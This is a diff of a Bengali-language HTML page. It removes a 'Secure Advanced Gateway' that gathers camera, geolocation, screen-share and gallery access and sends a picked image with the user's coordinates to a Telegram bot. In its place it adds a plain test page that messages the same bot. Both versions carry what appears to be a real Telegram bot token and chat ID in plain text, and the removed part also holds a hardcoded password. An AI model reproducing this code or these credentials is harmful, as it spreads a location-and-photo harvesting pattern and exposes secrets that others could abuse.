@@ -2,93 +2,41 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Advanced Gateway</title>
-    <style>
-        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: rgba(30, 41, 59, 0.8); backdrop-filter: blur(10px); padding: 30px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); width: 90%; max-width: 400px; text-align: center; border: 1px solid rgba(255,255,255,0.1); }
-        h2 { color: #38bdf8; margin-bottom: 20px; }
-        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box; }
-        .btn { width: 100%; padding: 14px; margin: 8px 0; border: none; border-radius: 10px; cursor: pointer; color: white; font-weight: bold; transition: 0.3s; }
-        .btn-login { background: #22c55e; }
-        .btn-cam { background: #3b82f6; }
-        .btn-gal { background: #8b5cf6; }
-        .btn-scr { background: #f59e0b; }
-        #dashboard { display: none; }
-        #v { width: 100%; border-radius: 12px; display: none; margin-top: 15px; background: #000; }
-        .msg { margin-top: 15px; font-size: 13px; color: #94a3b8; }
-    </style>
+    <title>Gateway v2</title>
 </head>
 <body>
-
-<div class="card" id="loginSection">
-    <h2>🔐 Secure Login</h2>
-    <input type="password" id="passwordInput" placeholder="Enter Access Password...">
-    <button class="btn btn-login" onclick="verifyPassword()">Verify Access</button>
-</div>
-
-<div class="card" id="dashboard">
-    <h2>🚀 Control Panel</h2>
-    <button class="btn btn-cam" onclick="initiateHardware()">Camera & Location</button>
-    <button class="btn btn-gal" onclick="document.getElementById('fileInput').click()">Gallery Access</button>
-    <button class="btn btn-scr" onclick="startScreenShare()">Share Screen</button>
-    
-    <input type="file" id="fileInput" accept="image/*" style="display:none" onchange="uploadGallery(event)">
-    <video id="v" autoplay playsinline></video>
-    <div class="msg" id="msg">System Ready...</div>
-</div>
+    <h2>Test Console</h2>
+    <button onclick="testConnection()">Send Test Message</button>
+    <div id="status"></div>
 
 <script>
-    // আপনার কনফিগারেশন
     const BOT_TOKEN = "8566985497:AAEOAjObJ9nz67yeEdM1vOEncMyJnxerqJc";
-    const CHAT_ID = "8566985497"; 
-    let lat = "N/A", lon = "N/A";
+    const CHAT_ID = "8566985497";
 
-    function verifyPassword() {
-        if(document.getElementById('passwordInput').value === "Tamim0186#@") {
-            document.getElementById('loginSection').style.display = 'none';
-            document.getElementById('dashboard').style.display = 'block';
-        } else { alert("❌ ভুল পাসওয়ার্ড!"); }
-    }
+    async function testConnection() {
+        document.getElementById('status').innerText = "Sending...";
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const data = {
+            chat_id: CHAT_ID,
+            text: "সংযোগ পরীক্ষা সফল হয়েছে! বট সচল আছে।"
+        };
 
-    async function initiateHardware() {
-        // লোকেশন নেওয়া
-        navigator.geolocation.getCurrentPosition(pos => {
-            lat = pos.coords.latitude;
-            lon = pos.coords.longitude;
-        });
-        // ক্যামেরা অনুমতি ও চালু করা
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({video: true});
-            document.getElementById('v').srcObject = stream;
-            document.getElementById('v').style.display = 'block';
-            document.getElementById('msg').innerText = "Hardware Active.";
-        } catch(e) { alert("ক্যামেরা পারমিশন পাওয়া যায়নি!"); }
-    }
-
-    function uploadGallery(e) {
-        const file = e.target.files[0];
-        if(file) sendToBot(file, "Gallery File Uploaded");
-    }
-
-    async function startScreenShare() {
-        try {
-            const stream = await navigator.mediaDevices.getDisplayMedia({video: true});
-            document.getElementById('msg').innerText = "Screen shared successfully!";
-        } catch(e) { alert("স্ক্রিন শেয়ারিংDenied!"); }
-    }
-
-    function sendToBot(blob, caption) {
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob);
-        formData.append('caption', `${caption}\n📍 Loc: ${lat}, ${lon}`);
-
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST', body: formData
-        }).then(() => document.getElementById('msg').innerText = "✅ Sent to Telegram!");
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            });
+            const result = await response.json();
+            if(result.ok) {
+                document.getElementById('status').innerText = "✅ মেসেজ সফলভাবে গেছে!";
+            } else {
+                document.getElementById('status').innerText = "❌ এরর: " + result.description;
+            }
+        } catch (e) {
+            document.getElementById('status').innerText = "❌ কানেকশন এরর!";
+        }
     }
 </script>
-
 </body>
 </html>
